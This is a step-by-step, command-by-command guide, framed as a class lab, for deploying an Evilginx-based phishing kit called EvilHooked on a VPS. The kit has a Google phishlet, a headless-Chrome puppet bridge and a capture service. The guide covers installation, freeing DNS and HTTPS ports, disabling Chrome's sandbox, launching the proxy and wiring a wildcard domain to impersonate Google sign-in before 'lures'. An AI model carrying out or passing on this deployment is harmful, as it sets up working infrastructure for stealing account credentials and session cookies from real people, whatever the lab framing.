# Simple Linux VPS setup (dummy guide)

This is the beginner guide. You do **one step at a time**. Copy the command. Press Enter. Read what the computer prints. Then go to the next step.

The long document `README_IMPROVEMENT.MD` is extra reading **after** this works.

**Lab only.** Use the class VPS and class domain. Do not use real Google / Yahoo / Apple accounts.

---

## What you need

- A laptop (Windows, Mac, or Linux).
- The project folder (the zip your professor gave you).
- The VPS address, SSH port, and password from class.

**Classroom example** (yours may be different — use what your professor wrote):

- IP: `104.207.64.149`
- SSH port: `22022`
- User: `root`

If your sheet says a different IP or port, use **your** numbers. Do not change anything else in the command except those.

---

## Step 1 — Open a terminal on your laptop

**Windows 10/11**

1. Click Start.
2. Type `PowerShell`.
3. Open **Windows PowerShell**.

**Mac**

1. Open **Terminal** (Spotlight → type `Terminal`).

You should see a blinking cursor. That is where you type.

---

## Step 2 — Log in to the VPS (SSH)

SSH means: “open a remote keyboard on the server.”

Type this (one line), then Enter:

```bash
ssh -p 22022 root@104.207.64.149
```

What each piece means:

| Piece | Meaning |
| --- | --- |
| `ssh` | the login program |
| `-p 22022` | use port **22022**, not the default 22 |
| `root` | username |
| `@` | “at” |
| `104.207.64.149` | the server’s IP |

**First time only:** it may ask `Are you sure you want to continue connecting (yes/no)?`  
Type `yes` and press Enter.

**Password:** nothing will move while you type. That is normal. Type the password, Enter.

**Success looks like:** the line starts with `root@` and the server name, not your laptop name.

**If it fails**

| Message | What to do |
| --- | --- |
| `Connection timed out` | Wrong IP, or the VPS is off, or your network blocks it |
| `Connection refused` | Wrong port. Check `-p 22022` |
| `Permission denied` | Wrong password. Try again slowly |
| `ssh is not recognized` (Windows) | Install [OpenSSH](https://learn.microsoft.com/windows-server/administration/openssh/openssh_install_firstuse) or use PuTTY |

---

## Step 3 — Put the project on the server

You need the unzipped project **on the VPS**, not only on your laptop.

### Easy way: upload the zip, then unzip

On **your laptop** (new terminal, while you are **not** inside SSH), go to the folder that contains the zip, then:

```bash
scp -P 22022 EvilHooked-Evilginx-main.zip root@104.207.64.149:/root/
```

Note: `scp` uses a **capital** `-P` for the port. `ssh` uses a **small** `-p`.

Then go back to the **SSH** window and unzip:

```bash
cd /root
unzip EvilHooked-Evilginx-main.zip
ls
```

You should see a folder named something like `EvilHooked-Evilginx-main`.

If `unzip` says command not found:

```bash
apt-get update
apt-get install -y unzip
unzip EvilHooked-Evilginx-main.zip
```

If the project is **already** on the server, skip this step. Just find the folder in Step 4.

---

## Step 4 — Go to the Linux kit folder (this is where students get lost)

The zip has two kits inside each other. Windows is **not** the folder you want on a VPS.

Copy this. If your unzip path is different, only change the first part.

```bash
cd /root/EvilHooked-Evilginx-main/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64
```

Now check you are in the right place:

```bash
ls
```

**You must see all three of these names:**

- `START.sh`
- `evilhooked`
- `puppet-bridge`

If you see `EvilHooked_Google_linux_amd64` again, you stopped one folder too high. Run:

```bash
cd EvilHooked_Google_linux_amd64
ls
```

If you see `START.bat` or `evilginx.exe`, you are in the **Windows** kit. Go back:

```bash
cd ..
cd EvilHooked_Google_linux_amd64
ls
```

Stop here until `ls` shows `START.sh`. Do not continue from the wrong folder.

---

## Step 5 — Confirm the Linux program (not the Windows one)

```bash
file evilhooked/evilginx/evilginx
```

You want a line that contains `ELF` (Linux).

You do **not** want `PE32` or `evilginx.exe`. Those are Windows.

---

## Step 6 — Install the programs the kit needs

Stay in the same folder. Run these **one block at a time**. Wait until it finishes (the prompt comes back).

**6a — Update the package list**

```bash
apt-get update
```

**6b — Small tools**

```bash
apt-get install -y curl ca-certificates gnupg python3 unzip fonts-liberation
```

**6c — Node.js (the puppet-bridge is JavaScript)**

```bash
curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
apt-get install -y nodejs
node -v
```

You want a version like `v20.something`. If it is `v12` or `v16`, tell your professor — it is too old.

**6d — A fake screen + Chrome (the VPS has no monitor)**

The kit opens Chrome even though nobody is sitting in front of the server. We install a fake screen (`xvfb`) and Chromium.

```bash
apt-get install -y xvfb chromium-browser
```

If that says it cannot find `chromium-browser`, try:

```bash
apt-get install -y xvfb chromium
```

Check Chrome exists:

```bash
which chromium-browser || which chromium || which google-chrome || which google-chrome-stable
```

If this prints **nothing**, Chrome is not installed. Stop and install Chrome before Step 9.

---

## Step 7 — Free port 53 (DNS)

The kit wants to listen on port **53**. Ubuntu often already uses 53 for `systemd-resolved`. If you skip this, start will fail later.

```bash
ss -lntup | grep ':53' || true
```

Then turn off the stub listener:

```bash
mkdir -p /etc/systemd/resolved.conf.d
echo -e '[Resolve]\nDNSStubListener=no' > /etc/systemd/resolved.conf.d/no-stub.conf
systemctl restart systemd-resolved
ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
```

---

## Step 8 — Free port 443 (HTTPS)

The kit wants port **443**. A default website (nginx/apache) may already use it.

```bash
systemctl stop nginx apache2 2>/dev/null || true
systemctl disable nginx apache2 2>/dev/null || true
```

It is OK if it says “not found”. That means nothing was using those names.

---

## Step 9 — Start the fake screen

Type these three lines:

```bash
export DISPLAY=:99
Xvfb :99 -screen 0 1920x1080x24 -ac >/tmp/xvfb.log 2>&1 &
sleep 1
echo "DISPLAY is $DISPLAY"
```

You should see: `DISPLAY is :99`

Leave this SSH window open. You will start the kit in the **same** window so it still has `DISPLAY`.

---

## Step 10 — (Often needed) Teach Chrome to run as root

On many VPS machines Chrome refuses to start as `root`. Do this **once**.

Open the Chrome starter:

```bash
cd /root/EvilHooked-Evilginx-main/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64
nano evilhooked/start-puppet-chrome.sh
```

Find the lines that start Chrome (`--remote-debugging-port`). Add these three lines next to the other `--` flags:

```
  --no-sandbox \
  --disable-dev-shm-usage \
  --disable-gpu \
```

Example of how that block should look:

```
nohup "$CHROME" \
  --remote-debugging-port="$PORT" \
  --user-data-dir="$PROFILE" \
  --no-sandbox \
  --disable-dev-shm-usage \
  --disable-gpu \
  --no-first-run \
  --no-default-browser-check \
  --disable-default-apps \
  --window-position=-32000,-32000 \
  --window-size=1366,768 \
  about:blank \
  >/tmp/evilhooked-cdp.log 2>&1 &
```

Save and exit nano: `Ctrl+O`, Enter, `Ctrl+X`.

---

## Step 11 — Start the kit

Still in the Linux kit folder, still in the same SSH window:

```bash
cd /root/EvilHooked-Evilginx-main/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64
chmod +x START.sh evilhooked/evilginx/evilginx evilhooked/start-evilginx.sh evilhooked/start-puppet-chrome.sh
export DISPLAY=:99
bash START.sh
```

**First run** may download Node packages. Wait. Do not close the window.

**Success clues** (you do not need every line, but you want most of these ideas):

- `Chrome CDP ready`
- `evilginx pid=...`
- `bridge pid=...`
- a JSON line with `"ok":true`
- the process stays running (the prompt does **not** come back)

**Keep this window open.** If you close it, the kit dies.

---

## Step 12 — Open a second SSH window and test

On your laptop, open **another** PowerShell/Terminal. Log in again:

```bash
ssh -p 22022 root@104.207.64.149
```

Then paste these checks:

```bash
curl -sS http://127.0.0.1:1000/health
echo
curl -sS http://127.0.0.1:9222/json/version
echo
ss -lntup | grep -E ':53|:443|:1000|:9222|:9092'
```

**What good looks like**

1. First command: JSON with `"ok": true` and `"phishlet": "google"`.
2. Second command: JSON mentioning Chrome or Chromium.
3. Third command: lines that include ports `53`, `443`, `1000`, `9222`. `9092` may appear after Evilginx is fully up.

If **1** fails: the Node bridge is not running. Read the first SSH window for `npm` errors.

If **2** fails: Chrome/Xvfb problem. Read `/tmp/evilhooked-cdp.log`:

```bash
cat /tmp/evilhooked-cdp.log
```

If **3** has no `:53` or `:443`: you skipped Step 7 or 8, or you are not root.

---

## Step 13 — Lab domain (only after Step 12 is green)

The kit ships with example names (`evilhooked.com`, `127.0.0.1`). Those are **not** your VPS.

Your professor will give you:

- a lab domain (example: `lab.example.com`)
- the VPS public IP (example: `104.207.64.149`)

You need **three** matching facts:

1. DNS at the registrar: `lab.example.com` and `*.lab.example.com` both point to the VPS IP.
2. File `evilhooked/evilginx-config/config.json`:
   - `general.domain` = your lab domain
   - `general.external_ipv4` = the VPS IP (not `127.0.0.1`)
   - `phishlets.google.hostname` = e.g. `google.lab.example.com`
3. File `evilhooked/puppet-google.json`:
   - `phishDomain` = the same hostname as in (2)

After you edit those files, stop the kit (Step 14) and start again (Step 11).

From a **lab PC**, you can test DNS like this (use your real names):

```bash
dig @104.207.64.149 google.lab.example.com
```

---

## Step 14 — Stop the kit

In the **first** SSH window (the one running `START.sh`): press `Ctrl+C`.

Then:

```bash
pkill -f 'evilhooked/evilginx/evilginx' || true
pkill -f 'puppet-bridge/src/index.js' || true
pkill -f 'chrome-profile-cdp|remote-debugging-port=9222' || true
```

---

## If something broke — read this first

| What you see | Simple meaning | Fix |
| --- | --- | --- |
| `ls` has no `START.sh` | Wrong folder | Step 4 |
| `file` says PE32 / `.exe` | Windows binary on Linux | Step 4 and 5 |
| bind error on 53 | Ubuntu DNS already using 53 | Step 7 |
| bind error on 443 | A website already using 443 | Step 8 |
| `Chrome/Chromium not found` | Browser not installed | Step 6d |
| `CDP not ready` | No fake screen, or Chrome refused root | Steps 9 and 10, then `cat /tmp/evilhooked-cdp.log` |
| `bridge not up` | Node failed | `cd puppet-bridge && npm install && node -v` |
| Health OK, website from home fails | Domain/IP not set | Step 13 |

---

## What you should **not** open to the internet

These must stay on the server itself (`127.0.0.1`):

- port `1000` (puppet-bridge)
- port `9222` (Chrome debug)
- port `9092` (local capture)

The class may use 53 and 443 on the lab network. Ask your professor before opening any firewall ports.

---

## You are done with “make it run”

When Step 12 is green, the Linux VPS setup is complete.

Then read `README_IMPROVEMENT.MD` for what the proxy and the puppet-bridge **are**, and for blue-team questions.

Do not skip from Step 2 to “lures” until health checks work. If the fake screen and the nested folder are wrong, nothing else matters.
